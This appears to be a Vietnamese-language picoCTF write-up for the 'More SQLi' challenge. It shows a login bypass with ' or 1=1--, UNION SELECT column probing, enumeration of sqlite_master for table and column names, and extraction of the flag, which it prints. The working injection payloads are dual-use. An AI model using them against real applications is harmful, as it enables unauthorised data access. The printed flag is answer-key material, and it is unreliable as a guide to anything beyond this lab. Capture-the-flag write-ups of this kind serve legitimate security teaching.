# More SQLi
![img](https://github.com/DucThinh47/PicoCTF_Writeups/blob/main/Web_Exploitation/images/image86.png?raw=true)

### Web page
![img](https://github.com/DucThinh47/PicoCTF_Writeups/blob/main/Web_Exploitation/images/image87.png?raw=true)

### Solution

Xem source page: 

![img](https://github.com/DucThinh47/PicoCTF_Writeups/blob/main/Web_Exploitation/images/image88.png?raw=true)

Chưa tìm được thông tin gì hữu ích.

Như tên thử thách, thử chèn SQLi payload bypass log in. Nhập username = **admin** và password = **' or 1=1--**:

![img](https://github.com/DucThinh47/PicoCTF_Writeups/blob/main/Web_Exploitation/images/image89.png?raw=true)

=> Login thành công. Kết quả hiển thị là một bảng danh sách các office bao gồm **3 cột** city, address và phone. 

Để xác định số cột trong câu truy vấn gốc, thử search **-1' UNION SELECT 1,2,3--+**:

![img](https://github.com/DucThinh47/PicoCTF_Writeups/blob/main/Web_Exploitation/images/image90.png?raw=true)

Tại sao lại search như vậy?

- Toán tử **UNION** yêu cầu số cột trong cả hai câu truy vấn phải giống nhau.

- Bằng cách thử **SELECT 1,2,3**, có thể kiểm tra xem câu truy vấn gốc có bao nhiêu cột.

- Nếu số cột khớp (ví dụ: 3 cột), kết quả sẽ được trả về. Nếu không, sẽ xảy ra lỗi.

Ví dụ:
- Giả sử câu truy cấn gốc là **SELECT id, username, email FROM users WHERE id = 'INPUT';**

- Khi nhập INPUT là **-1' UNION SELECT 1,2,3--+**, câu truy vấn trở thành: **SELECT id, username, email FROM users WHERE id = '-1' UNION SELECT 1,2,3--+';**

=> Như vậy xác nhận số lượng cột trong table là 3.

Tiếp tục thử search **-1' UNION SELECT sqlite_version(),2,3--+** để kiểm tra version của SQL:

![img](https://github.com/DucThinh47/PicoCTF_Writeups/blob/main/Web_Exploitation/images/image91.png?raw=true)

=> Tìm được SQL version là **3.31.1**.

Thử search payload cho sql version này. Tìm được payload để tìm tên bảng có sẵn trong db: **-1' UNION SELECT 1,group_concat(tbl_name),3 FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'--**. Nhập payload này vào thanh search:

![img](https://github.com/DucThinh47/PicoCTF_Writeups/blob/main/Web_Exploitation/images/image92.png?raw=true)

- Hàm **group_concat()** là một hàm trong SQLite dùng để nối các giá trị của một cột thành một chuỗi duy nhất, phân cách bởi dấu phẩy. 

- **tbl_name** là tên cột trong bảng **sqlite_master**, cột này sẽ chứa tên của các bảng trong cơ sở dữ liệu. 

- **sqlite_master** là một bảng hệ thống trong SQLite chứa thông tin về tất cả các bảng, chỉ mục, và các đối tượng khác trong cơ sở dữ liệu.

- **type='table'** là điều kiện để chỉ lấy các bản ghi có type là **table**, tức là chỉ lấy thông tin về các bảng.

- **tbl_name NOT like 'sqlite_%'** là điều kiện để loại bỏ các bảng hệ thống (các bảng bắt đầu bằng sqlite_), vì chúng thường không phải là bảng do người dùng tạo ra.

=> Tìm được các table có sẵn trong db: users, offices, hints và more_table.

Kiểm tra bảng **more_table**, tìm tên các cột có trong bảng này. Nhập payload sau vào thanh search **-1' UNION SELECT 1,sql,3 FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='more_table'--+**:

![img](https://github.com/DucThinh47/PicoCTF_Writeups/blob/main/Web_Exploitation/images/image93.png?raw=true)

- **sql**: sql là cột trong bảng **sqlite_master** chứa định nghĩa cấu trúc bảng (schema) của các bảng trong cơ sở dữ liệu SQLite.

- **type!='meta'**: Lọc ra các bản ghi có type không phải là 'meta'. Trong SQLite, type có thể là 'table', 'index', 'view', v.v.

- **sql NOT NULL**: Chỉ lấy các bản ghi có cột sql không rỗng. Cột sql chứa câu lệnh SQL được sử dụng để tạo ra bảng hoặc đối tượng đó.

- **name NOT LIKE 'sqlite_%'**: Loại bỏ các bảng hệ thống của SQLite (các bảng có tên bắt đầu bằng sqlite_).

- **name ='more_table'**: Chỉ lấy thông tin về bảng có tên là more_table.

=> Bảng **more_table** có 2 cột là **id** và **flag**.

Nhập payload sau vào thanh search để trích xuất data từ cột **flag**: **-1' UNION SELECT 1,flag,3 FROM more_table--+**:

![img](https://github.com/DucThinh47/PicoCTF_Writeups/blob/main/Web_Exploitation/images/image94.png?raw=true)

**Flag: picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_c8ee9477}**